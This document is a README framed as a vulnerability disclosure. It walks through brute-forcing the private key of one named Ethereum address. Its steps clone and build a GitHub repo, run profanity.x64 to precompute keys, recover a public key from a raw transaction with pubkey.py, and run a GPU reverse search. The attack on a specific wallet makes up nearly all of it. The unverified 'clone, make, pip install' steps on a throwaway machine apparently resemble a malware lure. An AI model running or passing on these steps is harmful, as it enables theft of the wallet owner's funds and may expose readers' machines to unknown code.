
## Disclosure


I have created this private repository with the required code dependencies specifically for demonstration to provide a proof of concept for the vulnerability I am disclosing.

I started the brute-force process on the address "0x66F38834895920589f66a8EaBc2b6A543B0EcA24" to uncover its corresponding private key, following these steps:

## Requirements
- A machine equipped with a high-performance GPU.
- A machine with a minimum of 32GB of RAM.
- A machine that will not disrupt ongoing workflows.
- A machine that is not critical for your work, as the intensive GPU usage may lead to system crashes.

### 1. Build the project
    
    $ git clone https://github.com/0xmstore/GSR
    $ cd GSR
    $ make


### 2. Compute public keys
Run the following command to precompute all seed public keys into `cache` directory.

    $ mkdir cache
    $ ./profanity.x64 -h 

### 3. Find any signed transaction

You need to have a signed transaction in order to reconstruct a public key. You can find it using [Etherscan](https://etherscan.io/).

Let's use the most recent transaction with the hash `0xabbb24be57e0ce2add855880913683004dc7ed74a950b77d2a8ef2b6d281e1af` and click on `Get Raw Tx Hex` to obtain the raw transaction.

<img width="971" alt="screengrab" src="https://github.com/0xmstore/GSR/assets/99334291/65424c25-e42d-4fd4-b20b-2f75a79e3363">
â€¨

Raw Tx Hex: `0x02f902f30182074683d17e8485060f70df7c8302eff3943fc91a3afd70395cd496c647d5a6cc9d4b2b7fad80b902843593564c000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000065bb8abf0000000000000000000000000000000000000000000000000000000000000002000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000001158e460913d000000000000000000000000000000000000000000000000000002eaea2cc6f04a1f000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002bc55126051b22ebb829d00368f4b12bde432de5da002710c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000002eaea2cc6f04a1f0c001a06fde3d5ff5e4371f1b07826011df2f7aad082cc019df847b965245867425dca5a02e72360c5b31f24f1ff122843908c31d23c1b4cc3337949048c039937d742029`

### 4. Reconsutruct the public key

To obtain the public key from the raw transaction, deploy the `pubkey.py` script.

    $ pip install -r requirements.txt
    $ python pubkey.py -t 0x02f902f30182074683d17e8485060f70df7c8302eff3943fc91a3afd70395cd496c647d5a6cc9d4b2b7fad80b902843593564c000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000065bb8abf0000000000000000000000000000000000000000000000000000000000000002000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000001158e460913d000000000000000000000000000000000000000000000000000002eaea2cc6f04a1f000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002bc55126051b22ebb829d00368f4b12bde432de5da002710c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000002eaea2cc6f04a1f0c001a06fde3d5ff5e4371f1b07826011df2f7aad082cc019df847b965245867425dca5a02e72360c5b31f24f1ff122843908c31d23c1b4cc3337949048c039937d742029

### 5. Run search

Once you have successfully recover the publickey, the next step is to run the search using the command line below

    $ ./profanity.x64 --reverse --steps 20000000 --cache --target publickey

### 6. Results

This search took approximately 21 days of intermittent running of the script to be able to generate the private key due to my MacBook M2 Pro's GPU power limitations. Successfully generating a private key signals a vulnerability. **However, if it fails to do so, it does not necessarily indicate that the wallet is safe!** You can try running step 5 with additional steps.


## Disclaimer

The vulnerability details disclosed in this document are intended solely for understanding and resolution. The information is confidential and should be treated as such, not to be disclosed or discussed outside authorised channels. It is provided in good faith to support security awarness and should not be used for any unauthorised or unlawful activities. The author assumes no liability for any actions taken by individuals or entities based on this information, and any misuse of this disclosure may be subject to legal action. All information herein have been reported responsibly and ethically to the appropriate parties.


Sincerely,
Nate
